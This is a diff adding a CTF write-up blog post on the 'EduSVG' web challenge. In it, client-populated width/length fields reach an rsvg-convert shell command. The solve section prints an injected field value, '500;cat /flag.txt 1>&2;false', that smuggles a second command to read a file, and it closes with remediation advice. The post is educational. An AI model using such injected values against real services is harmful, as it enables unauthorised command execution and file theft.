@@ -1,0 +1,90 @@
+---
+title: "EYCC: EduSVG"
+description: "The ID-card renderer trusted client-side SVG dimensions and piped them straight into a shell. rsvg-convert never stood a chance."
+date: 2026-07-27T00:00:00.000Z
+---
+
+**Platform:** EYCC · **Challenge:** EduSVG · **Category:** Web · **Difficulty:** Medium
+
+A university admission portal that takes your "vector profile picture" (SVG only), renders it to a PNG for your student ID, and hands you the card. Upload an SVG, the backend runs it through `rsvg-convert`. Simple. Except the width and height it feeds the converter come straight from _me_.
+
+![Admission portal upload page](/blog/edu-svg/website.png)
+
+## The tell
+
+I didn't even have to guess the sink. When rendering fails, the app is generous, it dumps a **Renderer Log Stream** _and_ an **Engine Trace** that prints the literal command it ran:
+
+```
+rsvg-convert -w 500 -h 500 /tmp/uploads/temp.svg -o /tmp/output/output.png
+```
+
+![Engine Trace leaking the rsvg-convert command](/blog/edu-svg/engin-trace.png)
+
+So `-w 500` and `-h 500` are the dimensions. Where do those `500`s come from? Two hidden form fields, `width` and `length`:
+
+```html
+<input type="hidden" id="width"  name="width"  value="500">
+<input type="hidden" id="length" name="length" value="500">
+```
+
+They're populated client-side by JS that reads `width`/`height` off the SVG and "sanitizes" them:
+
+```js
+widthInput.value  = w.replace(/px|em|rem|%|pt|pc/g, '').trim();
+lengthInput.value = h.replace(/px|em|rem|%|pt|pc/g, '').trim();
+```
+
+Client-side sanitization is not sanitization. It strips a few unit strings in _my_ browser and then trusts whatever lands in the POST body. The value goes into a shell string on the server with zero validation. That's a command injection sink with a neon sign on it.
+
+## The solve
+
+1. **Get a valid-ish SVG past the upload filter.** The injection isn't in the SVG XML, it's in the form field, so the file just needs to look like an SVG. Standard 500×500 red rect:
+    
+    ```xml
+    <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"><rect width="500" height="500" fill="red"/></svg>
+    ```
+    
+2. **Intercept in Burp and rewrite the `length` field.** Forget the JS, I own the raw request. Set:
+    
+    ```
+    500;cat /flag.txt 1>&2;false
+    ```
+    
+3. **Look at what the server actually runs:**
+    
+    ```
+    rsvg-convert -w 500 -h 500;cat /flag.txt 1>&2;false /tmp/uploads/temp.svg -o /tmp/output/output.png
+    ```
+    
+    Three commands now:
+    
+    - `rsvg-convert -w 500 -h 500` → no input file, so it chokes ("Input file is too short"). Don't care.
+    - `cat /flag.txt 1>&2` → read the flag, redirect **stdout → stderr**. The app echoes stderr into that visible Renderer Log Stream, so this is my output channel.
+    - `false /tmp/uploads/temp.svg -o /tmp/output/output.png` → `false` swallows the leftover original arguments, ignores them, and returns non-zero. That non-zero forces the "ID Card generation failed" branch, the exact path that prints the logs.
+4. **Flag lands in the error console.**
+    
+
+![Flag reflected in the renderer log](/blog/edu-svg/flag.png)
+
+```
+EYCC{V0lt_svg_width_height_cmd_inj_ftw}
+```
+
+## Why It Works
+
+Three mistakes stacked on top of each other:
+
+- **The server trusts client-supplied dimensions.** `width`/`length` are attacker-controlled, hidden fields populated by JS I fully control. The "sanitize units" step runs on my machine, which means it never ran at all.
+- **Those values are interpolated into a shell string** (classic `shell=True` behaviour) with no integer check. `;` ends the command; the rest is mine.
+- **stderr is reflected back to me.** I don't need out-of-band exfil or a blind oracle, `1>&2` puts the flag right on screen. The `false` at the end is the polish: it eats the trailing `-o /tmp/output/output.png` args and guarantees the failure branch that renders the log.
+
+Side note, `width` is injectable the same way. `length` is just the cleaner choice because it's the last argument before the input path, so `false` consumes the trailing junk neatly.
+
+## The Fix
+
+- **Never build shell strings from user input.** Call the converter with an argument array and no shell (`subprocess.run([...], shell=False)`). No shell, no `;`.
+- **Validate width/height server-side** as positive integers, and clamp them. Do it on the server, because the client can't be trusted to.
+- **Don't reflect stderr to the user.** Log it, show a generic error.
+- **Least privilege.** The rendering worker shouldn't be able to `cat /flag.txt` in the first place.
+
+_0xAdham_
